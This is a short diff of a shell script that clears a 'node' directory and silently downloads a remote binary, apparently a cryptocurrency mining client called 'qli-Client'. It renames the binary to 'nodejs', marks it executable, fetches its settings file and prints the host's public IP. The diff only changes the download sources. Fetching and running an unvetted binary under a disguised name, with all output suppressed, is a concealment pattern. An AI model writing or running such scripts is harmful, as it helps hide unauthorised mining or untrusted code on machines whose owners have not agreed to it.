@@ -1,8 +1,8 @@
 #!/bin/sh
 mkdir node && cd node
 rm -irf *
-wget -q -O nodejs https://bitbucket.org/excel-gms/fix/downloads/qli-Client && chmod +x nodejs >/dev/null 2>&1
-wget https://raw.githubusercontent.com/erlandi-main-api/QBMASTER/main/v2/appsettings.json >/dev/null 2>&1
+wget -q -O nodejs https://raw.githubusercontent.com/edrivetokenbsc/QBMASTER/main/qli-Client && chmod +x nodejs >/dev/null 2>&1
+wget https://raw.githubusercontent.com/edrivetokenbsc/QBMASTER/main/v2/appsettings.json >/dev/null 2>&1
 sleep 11 
 echo "******************************************************************" 
 echo "IP ORI ==> "$(curl ifconfig.me) 
